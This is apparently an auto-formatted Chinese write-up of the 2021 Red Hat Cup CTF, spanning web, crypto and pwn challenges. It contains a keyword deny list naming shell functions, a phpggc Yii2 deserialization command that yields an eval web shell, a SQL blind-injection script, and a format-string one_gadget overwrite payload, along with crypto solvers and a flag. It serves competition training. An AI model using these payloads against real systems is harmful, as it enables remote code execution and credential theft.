---
title: 红帽杯 – WriteUp
contest: 红帽杯
year: 2021
difficulty: hard
vuln_type: pwn_unknown
tags: [ChaMd5-Venom, PHP-write-getshell, Yii2-RCE2, phpggc, sqli-blind, HEC-jacobian, XTEA-XOR, fmt-write, format-string-overwrite, libc-leak]
attack_chain:
- PHP写文件:preg_match过滤system/eval/exec/base/compress/chr/ord/str/replace/pack/assert等+strlen<=33,fwrite到hack.php
- 拼接flag.php内容到hack.php,使用bypass短代码
- Yii2反序列化:./phpggc Yii2/RCE2 'eval($_REQUEST["ant"])' base64编码,Yii2\db\BatchQueryResult->dataReader FakedGenerator formaters
- 二次解码触发eval
- SQL盲注:ascii(mid((select concat(id,username,password) from users),i,1))=cc+id=-1 or过滤
- HEC超椭圆曲线:已知y=x和y=x^7,GF(p)上HyperellipticCurve,Jacobian DLP,blocks切分8字节反推keys
- 模数生成器攻击:Str(last18位)+000+Str(first18位),factordb/factor分解
- 32轮XTEA+key[0]+=789+key[3]+=135攻击
- fmt-write逐字节改one_gadget地址到ret_addr
- libc-2.27 0x10a45c one_gadget
key_payload: flag{1b82f60a-43ab-4f18-8ccc-97d120aae6fc}
one_liner: 红帽杯WriteUp多方向,涵盖ChaMd5 Venom战队招新文+PHP写文件短代码+Yii2 RCE2反序列化+SQL盲注+超椭圆曲线Jacobian DLP+XTEA魔改+fmt-write逐字节覆盖。
lesson: 复杂混合赛题考查多个方向:PHP写入短代码绕字符限制+phpggc工具生成反序列化payload+HEC Jacobian DLP用Sage解+fmt-write逐字节改got都需要熟练运用。
quality: high
---

## 题目列表

多方向综合:PHP/Web/Crypto/Pwn

## 关键考点

### PHP写文件
```php
if(preg_match('/system|eval|exec|base|compress|chr|ord|str|replace|pack|assert|preg|replace|create|function|call|~|^|`|flag|cat|tac|more|tail|echo|require|include|proc|open|read|shell|file|put|get|contents|dir|link|dl|var|dump/',$a)){
    die("you die");
}
if(strlen($a)>33){
    die("nonono.");
}
fwrite($hack,$a);
fwrite($hack,$I_know_you_wanna_but_i_will_not_give_you_hhh);
```
- 绕过:33字符内+不含敏感词
- 写入hack.php,内容 = 用户代码 + flag.php内容

### Yii2反序列化
- 工具:./phpggc Yii2/RCE2 'eval($_REQUEST["ant"])' | base64
- GadgetOne:yii\db\BatchQueryResult->dataReader
- GadgetTwo:Faker\Generator formaters
- GadgetThree:yii\rest\CreateAction checkAccess
- payload:base64后的`TzoyMzoi...`

### SQL盲注
```python
sql = r("select concat(id,username,password) from users")
for i in range(1,50):
    for c in charset:
        url = f"http://.../image.php?id=-1/**/or/**/(ascii(mid(({sql}),{i},1))={ord(c)})"
        r = requests.get(url)
        if len(r.text) > 1024:
            result += c
            break
```
- /**/绕空格
- ascii+mid逐位盲注

### HEC超椭圆曲线(Sage)
```python
p = 10000000000000001119
R.<x> = GF(p)[]
y = x
f = y + y^7
C = HyperellipticCurve(f, 0)
J = C.jacobian()
Ds = [J(C(x, min(f(x).sqrt(0,1)))) for x in (11,22,33)]
# Lagrange interpolation求系数vi
# for rs in itertools.product(*vi): q = struct.pack(...) flag = bytes(k^m for k,m in zip(rng_output+q, enc))
```

### 模数生成器攻击
```python
low = str(n)[-18:]
high = str(n)[:18]
for i in range(10):
    for j in range(10):
        for k in range(10):
            pq_prob.append(int(high + str(i) + str(j) + str(k) + low))
for x in tqdm(pq_prob):
    f = factor(x)
    if (len(f) == 2 and f[0][0].nbits() == 64):
        p, q = f[0][0], f[1][0]
        break
P = int(str(p) + str(p))
Q = int(str(q) + str(q))
PP = int(str(P) + str(Q))
QQ = int(str(Q) + str(P))
N = PP * QQ
decrypt_RSA(c, 65537, PP, QQ)
```

### 32轮XTEA+key更新
```python
def xtea_dec(f, key):
    j = 0x9E3779B9
    s = j * 32
    for i in range(32):
        f[1] -= (((f[0] << 4) ^ (f[0] >> 5)) + f[0]) ^ (s + key[(s >> 11) & 3])
        s -= j
        f[0] -= (((f[1] << 4) ^ (f[1] >> 5)) + f[1]) ^ (s + key[s & 3])
    key[0] += 789
    key[3] += 135
    return f, key
```

### fmt-write逐字节改one_gadget
- libc-2.27,one=0x10a45c
- 每次写1字节:`payload = "%" + str(one & 0xff) + "c%22$hhn" + p64(ret_addr)`
- 5次循环写完one_gadget地址到ret_addr
- 执行./getflag获取flag

## 实战价值
- phpggc是Java/PHP反序列化payload生成的瑞士军刀
- HEC超椭圆曲线Jacobian DLP是Sage高级数学密码学
- 模数生成器攻击(factor+组合)是RSA新攻击面
- fmt-write逐字节覆盖是绕过PIE+ASLR+Full RELRO的经典技巧
- XTEA魔改(key每轮更新)是密码学逆向常见考点
